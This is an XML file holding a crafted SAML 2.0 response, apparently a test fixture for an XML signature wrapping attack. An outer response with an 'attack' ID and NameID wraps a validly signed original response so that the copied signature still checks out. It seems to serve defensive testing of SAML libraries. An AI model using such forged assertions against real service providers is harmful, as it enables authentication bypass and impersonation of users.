<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="attack-response-id" InResponseTo="id-abc" Version="2.0" IssueInstant="2020-09-14T22:37:32Z" Destination="https://example.org/acs/post">
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="the-response-id" InResponseTo="id-abc" Version="2.0" IssueInstant="2020-09-14T22:37:32Z" Destination="https://example.org/acs/post">
	<saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">urn:mace:example.com:saml:roland:idp</saml:Issuer>
	<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
		<ds:SignedInfo>
			<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
			<ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>
			<ds:Reference URI="#the-response-id">
				<ds:Transforms>
					<ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
					<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
				</ds:Transforms>
				<ds:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"/>
				<ds:DigestValue>ykldcjeUTA6xMqk+BUQy9hvraOo=</ds:DigestValue>
			</ds:Reference>
		</ds:SignedInfo>
		<ds:SignatureValue>TF6666UcgC3+ZO/CevRxvLAOjpZEttJm90J2j/vDfGBsjnIcAkHDO42x1u/VvrDXJrWpGmmAZ0vBcW8Hg+6qhXNQngzSfMfID+eE9OBf7Ptj1flAea1WrfvNQPFDy0qlriusYjc7tL6tFmUgwzhfzI3V8xPOH1Bxmh5Cl92JOk8=</ds:SignatureValue>
		<ds:KeyInfo>
			<ds:X509Data>
				<ds:X509Certificate>MIICsDCCAhmgAwIBAgIJAJrzqSSwmDY9MA0GCSqGSIb3DQEBBQUAMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIEwpTb21lLVN0YXRlMSEwHwYDVQQKExhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcNMDkxMDA2MTk0OTQxWhcNMDkxMTA1MTk0OTQxWjBFMQswCQYDVQQGEwJBVTETMBEGA1UECBMKU29tZS1TdGF0ZTEhMB8GA1UEChMYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDJg2cms7MqjniT8Fi/XkNHZNPbNVQyMUMXE9tXOdqwYCA1cc8vQdzkihscQMXy3iPw2cMggBu6gjMTOSOxECkuvX5ZCclKr8pXAJM5cY6gVOaVO2PdTZcvDBKGbiaNefiEw5hnoZomqZGp8wHNLAUkwtH9vjqqvxyS/vclc6k2ewIDAQABo4GnMIGkMB0GA1UdDgQWBBRePsKHKYJsiojE78ZWXccK9K4aJTB1BgNVHSMEbjBsgBRePsKHKYJsiojE78ZWXccK9K4aJaFJpEcwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgTClNvbWUtU3RhdGUxITAfBgNVBAoTGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZIIJAJrzqSSwmDY9MAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADgYEAJSrKOEzHO7TL5cy6h3qh+3+JAk8HbGBW+cbX6KBCAw/mzU8flK25vnWwXS3dv2FF3Aod0/S7AWNfKib5U/SA9nJaz/mWeF9S0farz9AQFc8/NSzAzaVq7YbM4F6f6N2FRl7GikdXRCed45j6mrPzGzk3ECbupFnqyREH3+ZPSdk=</ds:X509Certificate>
			</ds:X509Data>
		</ds:KeyInfo>
	</ds:Signature>
	<samlp:Status xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
		<samlp:StatusCode xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
	</samlp:Status>
	<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:ds="http://www.w3.org/2000/09/xmldsig#" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" ID="the-assertion-id" IssueInstant="2020-09-14T22:37:32Z" Version="2.0">
		<saml:Issuer>urn:mace:example.com:saml:roland:idp</saml:Issuer>
		<saml:Subject>
			<saml:NameID Format="urn:oasis:names:tc:SAML:2.0:nameid-format:persistent">the-name-id</saml:NameID>
			<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
				<saml:SubjectConfirmationData InResponseTo="id-abc" NotOnOrAfter="2020-09-14T22:47:32Z" Recipient="https://example.org/acs/post"/>
			</saml:SubjectConfirmation>
		</saml:Subject>
		<saml:Conditions NotBefore="2020-09-14T22:27:32Z" NotOnOrAfter="2020-09-14T22:47:32Z">
			<saml:AudienceRestriction>
				<saml:Audience>urn:mace:example.com:saml:roland:sp</saml:Audience>
			</saml:AudienceRestriction>
		</saml:Conditions>
		<saml:AuthnStatement AuthnInstant="2020-09-14T22:37:32Z" SessionIndex="id-sessidx">
			<saml:AuthnContext>
				<saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>
			</saml:AuthnContext>
		</saml:AuthnStatement>
	</saml:Assertion>
</samlp:Response>
	<saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">urn:mace:example.com:saml:roland:idp</saml:Issuer>
	<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
		<ds:SignedInfo>
			<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
			<ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>
			<ds:Reference URI="#attack-response-id">
				<ds:Transforms>
					<ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
					<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
				</ds:Transforms>
				<ds:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"/>
				<ds:DigestValue>ykldcjeUTA6xMqk+BUQy9hvraOo=</ds:DigestValue>
			</ds:Reference>
		</ds:SignedInfo>
		<ds:SignatureValue>TF6666UcgC3+ZO/CevRxvLAOjpZEttJm90J2j/vDfGBsjnIcAkHDO42x1u/VvrDXJrWpGmmAZ0vBcW8Hg+6qhXNQngzSfMfID+eE9OBf7Ptj1flAea1WrfvNQPFDy0qlriusYjc7tL6tFmUgwzhfzI3V8xPOH1Bxmh5Cl92JOk8=</ds:SignatureValue>
		<ds:KeyInfo>
			<ds:X509Data>
				<ds:X509Certificate>MIICsDCCAhmgAwIBAgIJAJrzqSSwmDY9MA0GCSqGSIb3DQEBBQUAMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIEwpTb21lLVN0YXRlMSEwHwYDVQQKExhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcNMDkxMDA2MTk0OTQxWhcNMDkxMTA1MTk0OTQxWjBFMQswCQYDVQQGEwJBVTETMBEGA1UECBMKU29tZS1TdGF0ZTEhMB8GA1UEChMYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDJg2cms7MqjniT8Fi/XkNHZNPbNVQyMUMXE9tXOdqwYCA1cc8vQdzkihscQMXy3iPw2cMggBu6gjMTOSOxECkuvX5ZCclKr8pXAJM5cY6gVOaVO2PdTZcvDBKGbiaNefiEw5hnoZomqZGp8wHNLAUkwtH9vjqqvxyS/vclc6k2ewIDAQABo4GnMIGkMB0GA1UdDgQWBBRePsKHKYJsiojE78ZWXccK9K4aJTB1BgNVHSMEbjBsgBRePsKHKYJsiojE78ZWXccK9K4aJaFJpEcwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgTClNvbWUtU3RhdGUxITAfBgNVBAoTGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZIIJAJrzqSSwmDY9MAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADgYEAJSrKOEzHO7TL5cy6h3qh+3+JAk8HbGBW+cbX6KBCAw/mzU8flK25vnWwXS3dv2FF3Aod0/S7AWNfKib5U/SA9nJaz/mWeF9S0farz9AQFc8/NSzAzaVq7YbM4F6f6N2FRl7GikdXRCed45j6mrPzGzk3ECbupFnqyREH3+ZPSdk=</ds:X509Certificate>
			</ds:X509Data>
		</ds:KeyInfo>
	</ds:Signature>
	<samlp:Status xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
		<samlp:StatusCode xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
	</samlp:Status>
	<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:ds="http://www.w3.org/2000/09/xmldsig#" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" ID="the-assertion-id" IssueInstant="2020-09-14T22:37:32Z" Version="2.0">
		<saml:Issuer>urn:mace:example.com:saml:roland:idp</saml:Issuer>
		<saml:Subject>
			<saml:NameID Format="urn:oasis:names:tc:SAML:2.0:nameid-format:persistent">attack-name-id</saml:NameID>
			<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
				<saml:SubjectConfirmationData InResponseTo="id-abc" NotOnOrAfter="2020-09-14T22:47:32Z" Recipient="https://example.org/acs/post"/>
			</saml:SubjectConfirmation>
		</saml:Subject>
		<saml:Conditions NotBefore="2020-09-14T22:27:32Z" NotOnOrAfter="2020-09-14T22:47:32Z">
			<saml:AudienceRestriction>
				<saml:Audience>urn:mace:example.com:saml:roland:sp</saml:Audience>
			</saml:AudienceRestriction>
		</saml:Conditions>
		<saml:AuthnStatement AuthnInstant="2020-09-14T22:37:32Z" SessionIndex="id-sessidx">
			<saml:AuthnContext>
				<saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>
			</saml:AuthnContext>
		</saml:AuthnStatement>
	</saml:Assertion>
</samlp:Response>
